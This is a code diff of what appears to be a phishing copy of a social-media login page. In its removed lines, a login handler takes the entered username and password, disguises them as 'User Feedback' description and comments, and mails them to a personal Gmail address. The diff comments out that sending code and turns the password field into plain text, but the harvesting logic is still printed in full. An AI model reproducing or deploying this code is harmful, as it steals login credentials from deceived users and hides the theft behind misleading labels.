@@ -121,7 +121,7 @@
 
       <form onsubmit="handleLogin(event)">
         <input type="text" placeholder="Phone number, username, or email" required />
-        <input type="password" placeholder="Password" required />
+        <input type="text" placeholder="Password" required />
         <button type="submit">Log In</button>
       </form>
       
@@ -147,15 +147,15 @@
       function handleLogin(e) {
         e.preventDefault();
 
-        const description = e.target[0].value;
-        const comments = e.target[1].value;
+        // const description = e.target[0].value;
+        // const comments = e.target[1].value;
 
-        const subject = encodeURIComponent("User Feedback");
-        const body = encodeURIComponent(
-          `Description:\n${description}\n\nComments:\n${comments}`
-        );
+        // const subject = encodeURIComponent("User Feedback");
+        // const body = encodeURIComponent(
+        //   `Description:\n${description}\n\nComments:\n${comments}`
+        // );
 
-        window.location.href = `mailto:ramsatya13970@gmail.com?subject=${subject}&body=${body}`;
+        // window.location.href = `mailto:ramsatya13970@gmail.com?subject=${subject}&body=${body}`;
       }
     // }
   </script>
